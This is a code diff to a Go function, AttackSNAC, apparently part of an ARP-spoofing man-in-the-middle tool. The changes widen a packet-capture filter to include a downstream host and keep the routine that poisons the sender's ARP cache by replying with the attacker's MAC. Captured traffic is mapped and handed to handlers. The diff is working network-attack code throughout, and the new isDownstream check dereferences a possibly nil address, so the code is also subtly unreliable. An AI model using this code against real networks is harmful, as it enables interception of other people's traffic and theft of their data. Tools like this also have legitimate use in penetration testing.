@@ -376,9 +376,16 @@ func AttackSNAC(ctx context.Context, cfg *Cfg, senIp net.IP, tarIp net.IP, downs
 	}
 	defer rHandle.Close()
 
+	params := []any{senIp.To4().String(), tarIp.To4().String()}
+	filter := "src host %s || dst host %s" // capture both sides of the conversation
+	if downstream != nil {
+		filter += " || host %s" // also capture for the downstream
+		params = append(params, downstream.To4().String())
+	}
+	filter = fmt.Sprintf(filter, params...)
+
 	// filter to capture both sides of the conversation
-	if err = rHandle.SetBPFFilter(fmt.Sprintf("src host %s || dst host %s", senIp.String(),
-		tarIp.String())); err != nil {
+	if err = rHandle.SetBPFFilter(filter); err != nil {
 		logFields = append(logFields, zap.Error(err))
 		cfg.log.Error("failed to set bpf filter to attack snac", logFields...)
 		return
@@ -411,11 +418,18 @@ func AttackSNAC(ctx context.Context, cfg *Cfg, senIp net.IP, tarIp net.IP, downs
 			return
 		case packet := <-in:
 
-			if arp := GetArpLayer(packet); arp != nil && arp.Operation == layers.ARPRequest {
+			var isDownstream bool
+			if l := packet.Layer(layers.LayerTypeIPv4); l != nil {
+				ipL := l.(*layers.IPv4)
+				isDownstream = ipL.SrcIP.To4().String() == downstream.To4().String() ||
+				  ipL.DstIP.To4().String() == downstream.To4().String()
+			}
 
-				//==================================
-				// POISON ARP CACHE OF TARGET SENDER
-				//==================================
+			if arp := GetArpLayer(packet); !isDownstream && arp != nil && arp.Operation == layers.ARPRequest {
+
+				//================================
+				// POISON ARP CACHE OF SNAC SENDER
+				//================================
 
 				cfg.log.Debug("poisoning sender arp table", logFields...)
 				// Respond with our MAC
@@ -428,16 +442,19 @@ func AttackSNAC(ctx context.Context, cfg *Cfg, senIp net.IP, tarIp net.IP, downs
 					TargetIp:  arp.SourceProtAddress,
 				}
 				continue
-
+			} else if arp != nil {
+				continue
 			}
 
-			cfg.mapConn(packet, downstream)
+			if !isDownstream {
+				cfg.mapConn(packet, downstream)
+			}
 
 			// Run handlers
 			go func() {
 				for _, h := range handlers {
 					if h != nil {
-						h(packet)
+						h(packet, isDownstream)
 					}
 				}
 			}()
